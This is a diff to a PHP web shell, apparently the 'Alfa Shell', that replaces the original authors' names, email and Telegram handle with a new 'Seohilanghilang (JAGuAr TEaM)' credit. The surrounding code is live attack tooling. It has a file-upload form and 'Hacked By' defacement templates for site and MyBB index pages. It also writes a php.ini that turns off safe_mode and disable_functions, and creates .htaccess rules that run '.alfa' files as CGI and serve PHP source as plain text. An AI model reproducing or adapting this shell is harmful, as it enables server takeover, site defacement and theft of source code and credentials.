@@ -1186,7 +1186,7 @@ echo '<tr>
 <td height="16" colspan="2"><span class="header_vars">Disable Functions: </span><b>'.Alfa_GetDisable_Function().'</b></td>
 </tr>
 <tr>
-<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="alfa_solevisible"><center><a href="https://t.me/BatosayTools" target="_blank"><span><font class="solevisible-text" color="#0F0">Batosay1337 & IDNSEO</font></span></a></center></div></td>
+<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="alfa_solevisible"><center><a href="https://t.me/BatosayTools" target="_blank"><span><font class="solevisible-text" color="#0F0">Seohilanghilang</font></span></a></center></div></td>
 </tr>
 <tr>
 <td height="11" colspan="3"><span class="header_vars">Open_basedir :</span><b>'.$open_b.'</b> | <span class="header_vars">Safe_mode_exec_dir :</span><b>'.$safe_exe.'</b> | <span class="header_vars"> Safe_mode_include_dir :</span></b>'.$safe_include.'</b></td>
@@ -1564,8 +1564,8 @@ $about_us = $news->Send("http://solevisible.com/aboutus.php");
 if(empty($about_us)){
 $about_us = "<pre><center><img src='http://solevisible.com/images/farvahar-iran.png'><br>
 <b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
-<font color='#00A220'>Shell Coded By Batosay1337 & IDNSEO (ALFA TEaM)</font><br>
-<font color='#00A220'>Contact : batosay1337@gmail.com</font><br>
+<font color='#00A220'>Shell Coded By Seohilanghilang (JAGuAr TEaM)</font><br>
+<font color='#00A220'>Contact : Seohilanghilang@gmail.com</font><br>
 <font color='#00A220'>Telegram Channel: @BatosayTools</font><br>
 <font color='#FF0000'>Nikmati Hidup Tanpa Kopi bagaikan Bunga Tanpa Akar</font><br>
 <font color='#FF0000'>Alfa Shell Recorders</font><br>
@@ -2304,7 +2304,7 @@ echo "<table class='foot' width='100%' border='0' cellspacing='3' cellpadding='0
 <input type='hidden' name='ajax' value='true'>
 <input type='hidden' name='alfa1' value='uploadFile'>
 <input type='hidden' name='charset' value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
-<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ ./Batosay1337 &copy; 2020-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1E47z61hurQyBuCTJeYyDZqTXUCmkytpGD\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>batosay1337[at]gmail.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/solevisible'>@batosay1337</a></span></div></td>
+<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ ./Seohilanghilang &copy; 2020-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1E47z61hurQyBuCTJeYyDZqTXUCmkytpGD\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>seohilanghilang[at]gmail.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/solevisible'>@sall1504</a></span></div></td>
 </tr>
 </table>
 </div>
@@ -3438,7 +3438,7 @@ $table = array('td1' =>
 );
 create_table($table);
 echo "<br><div class='txtfont'>| Your Index |</div><br>
-<textarea name=index rows='19' cols='103'><title>Hacked By Batosay1337 & IDNSEO</title><b>Hacked By Batosay1337 & IDNSEO</b></textarea><br>
+<textarea name=index rows='19' cols='103'><title>Hacked By Seohilanghilang & IDNSEO</title><b>Hacked By Seohilanghilang</b></textarea><br>
 <input type='submit' value=' '>
 </form></center></center>";
 if(isset($_POST['alfa6'])){
@@ -3495,7 +3495,7 @@ $table = array('td1' =>
 );
 create_table($table);
 echo "<br><div class='txtfont'>| Your Index |</div><br>
-<textarea name='index' rows='19' cols='103'><title>Hacked By Batosay1337 & IDNSEO</title><b>Hacked By Batosay1337 & IDNSEO</b></textarea><br>
+<textarea name='index' rows='19' cols='103'><title>Hacked By Seohilanghilang & IDNSEO</title><b>Hacked By Seohilanghilang</b></textarea><br>
 <input type='submit' value=' '></form></center></center>";
 if($_POST['alfa8']=='>>'){
 $s0levisible="Powered By Solevisible";
@@ -3539,7 +3539,7 @@ $table = array('td1' =>
 create_table($table);
 echo "<br><div class='txtfont'>| Your Index |</div><br>
 <textarea name=mybbindex rows='19' cols='103'>
-<title>Hacked By Batosay1337 & IDNSEO</title><b>Hacked By Batosay1337 & IDNSEO</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
+<title>Hacked By Seohilanghilang</title><b>Hacked By Seohilanghilang</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
 if(isset($_POST['alfa6'])){
 $mybb_dbh = $_POST['alfa6'];
 $mybb_dbu = $_POST['alfa7'];
@@ -3684,7 +3684,7 @@ if(!empty($_POST['alfa2']) && isset($_POST['alfa2'])){
 echo '<center><b><big>htaccess for Apache created...!</center></b></big>';
 }
 if(!empty($_POST['alfa1'])&& isset($_POST['alfa1'])){
-@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By Batosay1337 & IDNSEO(ALFA TEaM)");
+@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By Seohilanghilang (JAGuAr TEaM)");
 echo '<center><b><big> php.ini created...!</center></b></big>';
 }
 if(!empty($_POST['alfa3']) && isset($_POST['alfa3'])){
@@ -5237,9 +5237,9 @@ function alfacgihtaccess($m,$d='', $symname=false){
 $readme = "";
 if($symname){$readme="\nReadmeName ".trim($symname);}
 if($m=='cgi'){
-$code = "#Coded By Batosay1337 & IDNSEO\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .alfa\nAddHandler cgi-script .alfa";
+$code = "#Coded By Seohilanghilang\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .alfa\nAddHandler cgi-script .alfa";
 }elseif($m=='sym'){
-$code = "#Coded By Batosay1337 & IDNSEO\nOptions Indexes FollowSymLinks\nDirectoryIndex solevisible.phtm\nAddType text/plain php html php4 phtml\nAddHandler text/plain php html php4 phtml{$readme}\nOptions all";
+$code = "#Coded By Seohilanghilang\nOptions Indexes FollowSymLinks\nDirectoryIndex solevisible.phtm\nAddType text/plain php html php4 phtml\nAddHandler text/plain php html php4 phtml{$readme}\nOptions all";
 }elseif($m=='shtml'){
 $code = "Options +Includes\nAddType text/html .shtml\nAddHandler server-parsed .shtml";
 }
